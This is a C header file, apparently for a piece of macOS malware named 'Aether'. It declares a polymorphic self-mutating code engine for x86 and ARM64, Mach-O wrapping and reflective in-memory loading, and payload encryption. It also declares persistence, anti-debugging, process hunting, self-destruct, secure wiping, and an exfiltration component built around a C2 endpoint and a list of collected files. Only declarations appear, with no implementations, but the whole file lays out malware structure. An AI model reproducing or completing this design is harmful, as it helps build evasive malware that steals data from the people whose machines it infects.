#ifndef AETHER_H
#define AETHER_H

/* headers */
#include <assert.h>
#include <errno.h>
#include <inttypes.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/random.h>
#include <sys/xattr.h>
#include <ftw.h>
#include <libgen.h>
#include <grp.h>
#include <pwd.h>
#include <uuid/uuid.h>
#include <dlfcn.h>
#include <signal.h>
#include <arpa/inet.h>
#include <sys/sysctl.h>
#include <libproc.h>

#include <mach-o/dyld.h>
#include <mach-o/loader.h>
#include <mach-o/getsect.h>
#include <mach-o/fat.h>
#include <mach/mach_time.h>
#include <mach/vm_region.h>
#include <mach/vm_map.h>
#include <pthread.h>

#include <openssl/rsa.h>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/rand.h>
#include <openssl/aes.h>
#include <openssl/rsa.h>

#include <curl/curl.h>
#include <zlib.h>

#include <Security/SecRandom.h>
#include <CommonCrypto/CommonCryptor.h>
#include <CommonCrypto/CommonDigest.h>
#include <CoreFoundation/CoreFoundation.h>


#include <immintrin.h>

/* Architecture-specific register definitions */
#if defined(__x86_64__) || defined(_M_X64)
    #include "decoder_x86.h"
#elif defined(__aarch64__) || defined(_M_ARM64)
    #include "decoder_arm64.h"
#endif

/* Macros */
#define KEY_SIZE 32
#define IV_SIZE 16
#define _CAPZ 1024
#define NOFFSET__ UINT64_MAX
#define _CVZ 64
#define PAD_ 8
#define _BEG 0.3f
#define _FIN 0.7f
#define _ZMAX 65536
#define _CAP(size) ((size) / 100 + 1)
#define LOADED_IMAGES 16
#define PS_Z 4096 
#define M_FL 100

#define PAGE_SIZE_64 0x4000  // PS_Z
#define ALIGN_PAGE(x) (((x) + PAGE_SIZE_64 - 1) & ~(PAGE_SIZE_64 - 1))
#define ALIGN_8(x) (((x) + 7) & ~7)

#define MX_GEN 3
static const uint8_t MORPH_MAGIC[8] = {'A', 'E', 'T', 'H', 'R', 0, 0, 0};

/* DEBUG=1 (FOO flag) */
#ifdef FOO
#define DBG(fmt, ...) fprintf(stderr, fmt, ##__VA_ARGS__)
#else
#define DBG(...) ((void)0)
#endif

/* Architecture */
#define ARCH_X86 0
#define ARCH_ARM 1

/* Detect architecture */
#if defined(__x86_64__)
    #define CURRENT_ARCH ARCH_X86
#elif defined(__aarch64__)
    #define CURRENT_ARCH ARCH_ARM
#else
    #define CURRENT_ARCH ARCH_X86  
#endif

typedef struct __attribute__((packed)) {
    uint8_t magic[8];
    uint32_t generation;
    uint32_t checksum;
} marker_t;  

/* liveness tracking */
typedef struct {
    uint8_t reg;
    bool iz_live;
    bool iz_vol;
    size_t def_offset;
    size_t last_use;
    uint32_t use_count;          /* Track how often register is used */
    bool is_callee_saved;        /* ABI preservation */
    bool has_side_effects;       /* System calls, SIMD ops */
    uint8_t preferred_replace;   
    size_t live_range;           
} live_reg_t;

typedef struct {
    live_reg_t regs[32];       
    int num_regs;
    uint8_t arch_type;           /* ARCH_X86, ARCH_ARM, etc */
    bool has_simd_context;       /* MMX/SSE/AVX in use */
    bool in_system_call;         /* Special system call preservation */
    uint32_t abi_flags;          /* Calling convention markers */
} liveness_state_t;

/* Register classes */
typedef enum {
    REGCLASS_GPR = 0,
    REGCLASS_SIMD,
    REGCLASS_SPECIAL,    /* SP, FP, etc */
    REGCLASS_TEMP,       /* Scratch registers */
    REGCLASS_CALLEE_SAVED,
    REGCLASS_CALLER_SAVED
} reg_class_t;

/* Extern symbol from mach-o */
extern struct mach_header_64 _mh_execute_header;

/* Debugger */
typedef int (*sysctl_fn)(int*,u_int,void*,size_t*,void*,size_t);

/* enums/typedefs */

typedef enum {
    MUT_SUB, MUT_EQUIV, MUT_PRED, MUT_DEAD, MUT_SPLIT,
    MUT_OBFUSC, MUT_FLATTEN, MUT_REORDER, MUT_JUNK,
    MUT_REG, MUT_SEMANTIC, MUT_EXPAND
} mutx_type_t;

typedef enum {
    ST_NOP = 0, ST_ALU, ST_BIT, ST_MOV, ST_CMP, ST_FLOW,
    ST_JCC, ST_STK, ST_FLAG, ST_MEM, ST_SYS
} sem_type_t;

typedef enum { OP_NONE, OP_REG, OP_MEM, OP_IMM, OP_REL } op_type_t;
typedef bool (*memread_fn)(void *dest, uintptr_t addr, size_t size);

/* small operand used by semantic metadata */
typedef struct {
    uint8_t type;
    uint8_t size;
    uint8_t reg;
    int64_t disp;
    uint64_t imm;
    bool izre;
    bool izwri;
} m_operand_t;

/* ChaCha RNG state */
typedef struct {
    uint8_t key[KEY_SIZE];
    uint8_t iv[16];
    uint8_t stream[64];
    size_t position;
    uint64_t counter;
} chacha_state_t;

/* For inline mutator referenced before its definition */
__attribute__((always_inline)) inline void _mut8(uint8_t *code, size_t size, chacha_state_t *rng, unsigned gen);

/* Core typedefs and structs */

/* Single entry */
typedef struct {
    size_t offset;
    size_t length;
    mutx_type_t type;
    uint32_t gen;
    char des[64];
} mutx_entry_t;

/* Container for entries */
typedef struct {
    mutx_entry_t *entries;
    size_t count;
    size_t cap;
} muttt_t;

/* Register liveness */
typedef struct {
    uint8_t reg;
    size_t def_offset;
    size_t last_use;
    bool iz_live;
    bool iz_vol;
} reg_liveness_t;

/* Basic flow node */
typedef struct {
    size_t start;
    size_t end;
    size_t id;
    size_t successors[4];
    size_t num_successors;
    bool is_exit;
} blocknode;

typedef struct {
    blocknode *blocks;
    size_t num_blocks;
    size_t cap_blocks;
    size_t entry_block;
    size_t exit_block;
} flowmap;

/* Dominator info and loop info */
typedef struct {
    size_t *dominators;
    size_t num_doms;
    size_t *dominated;
    size_t num_dominated;
} dom_info_t;

typedef struct {
    size_t header;
    size_t *body;
    size_t body_size;
    size_t *exits;
    size_t exits_size;
} loop_info_t;

/* Call graph */
typedef struct {
    size_t caller;
    size_t callee;
    size_t call_site;
} call_edge_t;

typedef struct {
    call_edge_t *edges;
    size_t num_edges;
    size_t *functions;
    size_t num_functions;
} call_graph_t;

/* Instruction info */
typedef struct {
    size_t off;
    size_t len;
    uint8_t type;
    bool cf;
    bool valid;
    uint8_t raw[16];
    uint8_t opcode_prefix[4];
} instr_info_t;

/* Operand and instruction types */
typedef struct {
    op_type_t type;
    uint8_t size;
    union {
        uint8_t reg;
        struct { uint8_t base, index, scale; int64_t disp; } mem;
        uint64_t imm;
    };
} operand_t;

/* ARM64 operation types */
typedef enum {
    ARM_OP_NONE = 0,
    ARM_OP_BRANCH,
    ARM_OP_BRANCH_LINK,
    ARM_OP_BRANCH_COND,
    ARM_OP_RET,
    ARM_OP_BR,
    ARM_OP_BLR,
    ARM_OP_ADD,
    ARM_OP_SUB,
    ARM_OP_MOV,
    ARM_OP_AND,
    ARM_OP_ORR,
    ARM_OP_EOR,
    ARM_OP_LDR,
    ARM_OP_STR,
    ARM_OP_LDP,
    ARM_OP_STP,
    ARM_OP_CMP,
    ARM_OP_CMN,
    ARM_OP_TST,
    ARM_OP_MUL,
    ARM_OP_MADD,
    ARM_OP_MSUB,
    ARM_OP_UDIV,
    ARM_OP_SDIV,
    ARM_OP_LSL,
    ARM_OP_LSR,
    ARM_OP_ASR,
    ARM_OP_ROR,
    ARM_OP_ADRP,
    ARM_OP_ADR,
    ARM_OP_SVC,
    ARM_OP_MRS,
    ARM_OP_MSR,
    ARM_OP_SYS,
    ARM_OP_NOP,
    ARM_OP_CBZ,
    ARM_OP_CBNZ,
    ARM_OP_TBZ,
    ARM_OP_TBNZ
} arm_op_type_t;

/* ARM64 register type */
typedef uint8_t arm_reg_t;

/* ARM64 condition codes */
typedef enum {
    ARM_COND_EQ = 0,  // Equal
    ARM_COND_NE = 1,  // Not equal
    ARM_COND_CS = 2,  // Carry set (HS)
    ARM_COND_CC = 3,  // Carry clear (LO)
    ARM_COND_MI = 4,  // Minus/negative
    ARM_COND_PL = 5,  // Plus/positive or zero
    ARM_COND_VS = 6,  // Overflow
    ARM_COND_VC = 7,  // No overflow
    ARM_COND_HI = 8,  // Unsigned higher
    ARM_COND_LS = 9,  // Unsigned lower or same
    ARM_COND_GE = 10, // Signed greater than or equal
    ARM_COND_LT = 11, // Signed less than
    ARM_COND_GT = 12, // Signed greater than
    ARM_COND_LE = 13, // Signed less than or equal
    ARM_COND_AL = 14, // Always
    ARM_COND_NV = 15  // Always (reserved)
} arm_condition_t;

/* ARM64 instruction structure */
typedef struct {
    uint32_t raw;
    uint8_t len;
    uint8_t opcode_len;
    uint16_t opcode;
    arm_op_type_t type;
    
    // Operands
    arm_reg_t rd;
    arm_reg_t rn;
    arm_reg_t rm;
    arm_reg_t ra;  // For MADD/MSUB
    
    uint64_t imm;
    int64_t target;
    uint8_t imm_size;
    
    // Flags
    bool valid;
    bool is_64bit;
    bool is_signed;
    bool is_control_flow;
    bool modifies_ip;
    bool is_privileged;
    bool privileged;  // Alias
    bool ring0;       // Alias
    
    // Shift/extend info
    uint8_t shift_type;  // 0=LSL, 1=LSR, 2=ASR, 3=ROR
    uint8_t shift_amount;
    uint8_t extend_type; // UXTB, UXTH, UXTW, UXTX, SXTB, SXTH, SXTW, SXTX
    
    // Condition code (for B.cond)
    arm_condition_t condition;
    
    // Register tracking
    uint8_t regs_read[4];
    uint8_t regs_written[2];
    uint8_t num_regs_read;
    uint8_t num_regs_written;
} arm64_inst_t;

/* x86 instruction */
typedef struct {
    uint8_t raw[15];
    uint8_t len;
    uint8_t prefixes;
    uint8_t rex;
    uint8_t opcode[4];
    uint8_t opcode_len;
    uint8_t modrm;
    uint8_t sib;
    uint8_t disp_size;
    uint8_t imm_size;
    uint8_t seg;
    int64_t disp;
    int64_t target;
    uint64_t imm;
    uint64_t resolved_mem;
    bool vex;
    bool evex;
    bool has_modrm;
    bool has_sib;
    bool rex_w;
    bool rex_r;
    bool rex_x;
    bool rex_b;
    bool modifies_ip;
    bool is_control_flow;
    bool valid;
    bool ring0;
    bool lock;
    bool rep;
    bool repne;
    bool opsize_16;
    bool addrsize_32;
    bool rip_relative;
    uint8_t vex_mmmm;
    uint8_t vex_pp;
    uint8_t vex_L;
    uint8_t vex_vvvv;
    uint8_t evex_mmmm;
    uint8_t evex_pp;
    uint8_t evex_L;
    uint8_t evex_vvvv;
    uint8_t sib_base;
    uint8_t sib_index;
    uint8_t sib_scale;
    operand_t ops[3];
} x86_inst_t;

typedef struct {
    uint64_t orig_va;
    size_t len;
    uint8_t *backup;
} tramp_backup_t;

/* Semantic */
typedef struct {
    sem_type_t sem_type;
    m_operand_t ops[3];
    uint8_t num_ops;
    bool f_out;
    bool f_in;
    bool m_out;
    bool m_in;
    bool stk_out;
    bool stk_in;
    uint8_t stk_adj;
    bool ring0;
    bool voll;
} sem_meta_t;

/* analysis/rewrites */
typedef struct {
    size_t off;
    size_t blki;
    int typ;
    uint64_t abs_target;
    size_t inst_len;
} patch_t;

/* Recursive flow structures */
typedef struct {
    size_t start;
    size_t end;
    size_t successors[4];
    size_t num_successors;
    bool is_exit;
} rec_block_t;

typedef struct {
    rec_block_t *blocks;
    size_t num_blocks;
    size_t cap_blocks;
    bool *visited;
    size_t code_size;
} rec_flowmap;

/* Engine/context settings */
typedef struct {
    const uint8_t *debug_code;
    size_t debug_code_size;
    bool unsafe_mode;
    uint8_t arch_type;           /* ARCH_X86 or ARCH_ARM */
    unsigned mutation_count;     /* Total mutations applied */
    unsigned generation;         /* Current generation number */
} engine_context_t;

/* Text section mapping */
typedef struct {
    uint64_t file_start;
    uint64_t file_end;
    uint64_t vm_start;
    uint64_t vm_end;
} text_section_t;

/* Small x86 read/write summary */
typedef struct {
    uint8_t rd_reegs[8];
    uint8_t wr_reegs[8];
    uint8_t regs_rd;
    uint8_t regs_wr;
    bool mem_rd;
    bool mem_wr;
    bool flag_rd;
    bool flag_wr;
} x86_shit;

/* context_t: central workspace */
typedef struct {
    uint8_t *ogicode;
    uint8_t *working_code;
    size_t codesz; 
    size_t buffcap;
    flowmap cfg;
    muttt_t muttation;
    uint64_t ranges[_CAPZ];  
    size_t num_ranges_capacity;
    size_t numcheck;
    chacha_state_t rng;
    bool is_shellcode;
    void *morph_ptr;
    size_t morph_size;
    uint64_t vm_base;
    uint64_t text_vm_start;
    tramp_backup_t *tramps;
    size_t tramps_cap;
    size_t tramps_count;
    int64_t text_slide;
    liveness_state_t liveness;
    struct mach_header_64 *hdr;
    
    size_t original_size;
    size_t max_allowed_growth;
    size_t current_growth;
} context_t;

typedef struct {
    uint8_t *code;
    size_t size;
    liveness_state_t liveness;
    flowmap cfg;
    muttt_t *log;
    chacha_state_t *rng;
    unsigned generation;
    bool cfg_analyzed;
    bool liveness_analyzed;
} mutation_context_t;

typedef enum {
    PHASE_SETUP = 0,
    PHASE_ANALYSIS,
    PHASE_PRE_MUTATION, 
    PHASE_CORE_MUTATION,
    PHASE_POST_MUTATION,
    PHASE_CLEANUP
} engine_phase_t;

typedef struct {
    uint8_t code[128];
    size_t len;
    bool valid;
} expansion_t;

typedef struct {
    uint8_t code[64]; 
    size_t len;
    bool valid;
} arm64_expansion_t;

// Wipe 
typedef enum {
    WIPE_ZERO,
    WIPE_ONE,
    WIPE_RANDOM,
    WIPE_CUSTOM
} wipe_pattern_t;

typedef struct {
    wipe_pattern_t *patterns;
    int passes;
    unsigned char custom;
} wipe_conf_t;

typedef struct {
    char *data;
    size_t size;
} mem_buf_t;

typedef struct {
    char *path;
    size_t size;
} file_t;

typedef struct {
    uint8_t key[32];
    uint8_t iv[16];
    size_t len;
    uint8_t data[128];
} enc_vault_t;

typedef struct {
    void *base;              
    size_t size;            
    struct mach_header_64 *header;
    void *entry_point;      
    bool loaded;            
    uint8_t *original_data; 
    uint64_t slide;         
    uint64_t min_vmaddr;     
    bool has_relocations;   
    pthread_t entry_thread;  
    bool entry_running;     
} image_t;

typedef struct {
    // Header
    struct mach_header_64 header;
    
    // Load commands
    struct segment_command_64 pagezero_segment;
    struct segment_command_64 text_segment;
    struct section_64 text_section;
    struct segment_command_64 linkedit_segment;
    struct symtab_command symtab_cmd;
    struct dysymtab_command dysymtab_cmd;
    struct entry_point_command entry_cmd;
    
    // Padding to align code
    uint8_t padding[256];
} __attribute__((packed)) macho_header_t;

typedef struct {
    uint8_t *buffer;
    size_t size;
    size_t capacity;
    
    // Offsets within buffer
    size_t header_size;
    size_t code_offset;
    size_t code_size;
    size_t symtab_offset;
    size_t strtab_offset;
    size_t strtab_size;
} macho_builder_t;


// Global state for exfil
extern char *_strings[8];
extern file_t *files[M_FL];
extern int fileCount;
extern char tmpDirectory[64];
extern char C2_ENDPOINT[1024];

size_t crypt_payload(const int mode,
                            const uint8_t *key,
                            const uint8_t *iv,
                            const uint8_t *src,
                            uint8_t *dst,
                            const size_t size);
void chacha20_block(const uint32_t[8],uint32_t,const uint32_t[3],uint32_t[16]);
void chacha20_init(chacha_state_t*,const uint8_t*,size_t);
uint32_t chacha20_random(chacha_state_t*);

void mutate(uint8_t *code, size_t size, chacha_state_t *rng, unsigned gen, engine_context_t *ectx);
void mut_sh3ll(uint8_t *code, size_t size, chacha_state_t *rng, unsigned gen, engine_context_t *ectx);

void boot_live(liveness_state_t *ls);
void pulse_live(liveness_state_t *ls, size_t n, const void *ctx);
uint8_t jack_reg(const liveness_state_t *ls, uint8_t reg, size_t size, chacha_state_t *rng);
void spew_trash(uint8_t *buf, size_t *len, chacha_state_t *rng);
void freeme(muttt_t *m);
int init_mut(muttt_t *log);

void hunt_procs(void);

void drop_mut(muttt_t *log, size_t offset, size_t length, mutx_type_t type, uint32_t gen, const char *desc);
bool sketch_flow(uint8_t *code, size_t size, flowmap *fm);
size_t decode_map(const uint8_t *code, size_t size, instr_info_t *out, size_t outcap);
int chk_map(const instr_info_t *map, size_t maplen, size_t codesz);
void init_engine(engine_context_t *ctx);

/* Decoder */
bool decode_x86(const uint8_t *code, uintptr_t ip, x86_inst_t *inst, memread_fn mem_read);
bool decode_x86_withme(const uint8_t *code, size_t size, uintptr_t ip, x86_inst_t *inst, memread_fn mem_read);
bool decode_arm64(const uint8_t *code, arm64_inst_t *inst);

/* Expansion */
bool apply_expansion(uint8_t *code, size_t *size, size_t offset, 
                     const x86_inst_t *inst, liveness_state_t *liveness,
                     chacha_state_t *rng);
size_t expand_code_section(uint8_t *code, size_t size, size_t max_size,
                            liveness_state_t *liveness, chacha_state_t *rng,
                            unsigned expansion_intensity);
size_t expand_with_chains(uint8_t *code, size_t size, size_t max_size,
                          liveness_state_t *liveness, chacha_state_t *rng,
                          unsigned chain_depth, unsigned expansion_intensity);
size_t mov_immediates(uint8_t *code, size_t size, size_t max_size,
                                   liveness_state_t *liveness, chacha_state_t *rng,
                                   unsigned chain_depth);
size_t chain_expand_arithmetic(uint8_t *code, size_t size, size_t max_size,
                               liveness_state_t *liveness, chacha_state_t *rng,
                               unsigned chain_depth);

#if defined(__aarch64__) || defined(_M_ARM64)
bool apply_arm64_expansion(uint8_t *code, size_t *size, size_t max_size,
                           size_t offset, const arm64_inst_t *inst,
                           liveness_state_t *liveness, chacha_state_t *rng);
size_t expand_arm64_code_section(uint8_t *code, size_t size, size_t max_size,
                                 liveness_state_t *liveness, chacha_state_t *rng,
                                 unsigned expansion_intensity);
#endif

/* Mutation */
void scramble_x86(uint8_t *code, size_t size, chacha_state_t *rng, unsigned gen,
                  muttt_t *log, liveness_state_t *liveness, unsigned mutation_intensity);
#if defined(__aarch64__) || defined(_M_ARM64)
void scramble_arm64(uint8_t *code, size_t size, chacha_state_t *rng, unsigned gen,
                    muttt_t *log, liveness_state_t *liveness, unsigned mutation_intensity);
#endif

/* Control flow */
void flatline_flow(uint8_t *code, size_t size, flowmap *fm, chacha_state_t *rng);
void shuffle_blocks(uint8_t *code, size_t size, void *rng);

/* Validation */
bool is_chunk_ok(const uint8_t *chunk, size_t max_len);
bool is_op_ok(const uint8_t *op);
size_t snap_len(const uint8_t *buf, size_t maxlen);

/* Mach-O */
uint8_t* wrap_macho(const uint8_t *code, size_t code_size, size_t *out_size);  
bool V_machO(const uint8_t *data, size_t size);

/* Reflective loading */
bool exec_mem(uint8_t *data, size_t size);
image_t* load_image(uint8_t *data, size_t size);  

/* Persistence */
int persist(void);

/* Hunting */
void hunt_procs(void);
void Spawn(void);

/* Self-mutation */
int mutator(void);

/* Self-destruct */
void k_ill(void) __attribute__((noreturn));
void panic(void) __attribute__((noreturn));

/* Vault */
void Init_str(void);
void Clean_str(void); 

/* Exfiltration */
int sendProfile(void);
void mint_uuid(char *id);

/* Anti-debug */
int scan(void);

#endif /* AETHER_H */
